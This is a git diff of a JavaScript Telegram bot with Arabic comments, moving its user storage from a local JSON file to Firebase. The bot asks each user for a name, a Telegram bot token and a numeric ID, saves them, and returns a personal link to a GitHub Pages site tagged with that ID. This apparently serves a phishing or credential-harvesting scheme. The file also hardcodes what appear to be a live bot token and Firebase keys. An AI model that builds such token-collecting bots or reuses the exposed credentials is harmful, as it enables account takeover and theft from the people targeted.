@@ -1,52 +1,71 @@
 import { Telegraf } from 'telegraf';
-import fs from 'fs';
-import http from 'http'; // ✅ تم إضافة هذا السطر
+import { initializeApp } from 'firebase/app';
+import { getDatabase, ref, set, get, child } from 'firebase/database';
 
-const mainBot = new Telegraf('8180329300:AAFg-ruLWrlFkoPAy8Lu-gXIGHNkDNfK0O4'); // ✨ غيّر هذا بالتوكن حقك
+// إعداد Firebase
+const firebaseConfig = {
+  apiKey: "AIzaSyCCEvGjvP8gw12mFYnxV_XPOHhM_zHJB_U",
+  authDomain: "migad-9aa39.firebaseapp.com",
+  databaseURL: "https://migad-9aa39-default-rtdb.firebaseio.com",
+  projectId: "migad-9aa39",
+  storageBucket: "migad-9aa39.appspot.com",
+  messagingSenderId: "82386152423",
+  appId: "1:82386152423:web:fb466405bbc8c12d2beb42",
+  measurementId: "G-2LCCDX0159"
+};
 
-function loadUsers() {
-  try {
-    return JSON.parse(fs.readFileSync('users.json'));
-  } catch {
-    return {};
-  }
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+// 🧠 المتغيرات
+const bot = new Telegraf('8180329300:AAFg-ruLWrlFkoPAy8Lu-gXIGHNkDNfK0O4');
+
+// 🧩 دالة تحميل بيانات المستخدم من Firebase
+async function getUser(chatId) {
+  const snapshot = await get(child(ref(db), `users/${chatId}`));
+  return snapshot.exists() ? snapshot.val() : null;
 }
 
-function saveUsers(users) {
-  fs.writeFileSync('users.json', JSON.stringify(users, null, 2));
+// 🧩 دالة حفظ المستخدم في Firebase
+function saveUser(chatId, data) {
+  return set(ref(db, 'users/' + chatId), data);
 }
 
-const users = loadUsers();
-
-mainBot.start((ctx) => {
+// 🟢 عند البدء
+bot.start(async (ctx) => {
   const chatId = ctx.chat.id.toString();
-  if (!users[chatId]) {
-    users[chatId] = { step: 'name' };
+  const user = await getUser(chatId);
+  
+  if (!user) {
+    await saveUser(chatId, { step: 'name' });
     ctx.reply('👋 أهلاً بك! ما هو اسمك؟ 🤔');
   } else {
     ctx.reply('🔁 لقد بدأت من قبل!');
   }
 });
 
-mainBot.on('text', (ctx) => {
+// 🟡 استجابة النصوص
+bot.on('text', async (ctx) => {
   const chatId = ctx.chat.id.toString();
   const text = ctx.message.text;
-
-  if (!users[chatId]) {
+  
+  const user = await getUser(chatId);
+  
+  if (!user) {
     ctx.reply('🌀 اكتب /start للبدء.');
     return;
   }
-
-  const user = users[chatId];
-
+  
   if (user.step === 'name') {
     user.name = text;
     user.step = 'token';
+    await saveUser(chatId, user);
     ctx.reply('🔑 أرسل الآن التوكن الخاص بك:');
   } else if (user.step === 'token') {
     if (text.includes(':')) {
       user.token = text;
       user.step = 'id';
+      await saveUser(chatId, user);
       ctx.reply('🔒 أرسل الآن الـ ID الخاص بك:');
     } else {
       ctx.reply('⚠️ التوكن غير صحيح. تأكد أن يحتوي على ":"');
@@ -55,11 +74,11 @@ mainBot.on('text', (ctx) => {
     if (/^\d{5,}$/.test(text)) {
       user.id = text;
       user.step = 'done';
+      await saveUser(chatId, user);
       ctx.reply(`✅ تم الحفظ بنجاح!
 
 🌐 رابطك الخاص:
 https://qwertyuiopqw12.github.io/Boot-/?ref=${text}`);
-      saveUsers(users);
     } else {
       ctx.reply('⚠️ ID غير صحيح. يجب أن يكون أرقام فقط.');
     }
@@ -68,8 +87,6 @@ https://qwertyuiopqw12.github.io/Boot-/?ref=${text}`);
   }
 });
 
-mainBot.launch();
+// 📡 تشغيل البوت
+bot.launch();
 console.log('🤖 تم تشغيل البوت!');
-
-// تحايل لفتح منفذ وهمي لتجنب خطأ Render
-http.createServer(() => {}).listen(process.env.PORT || 3000);
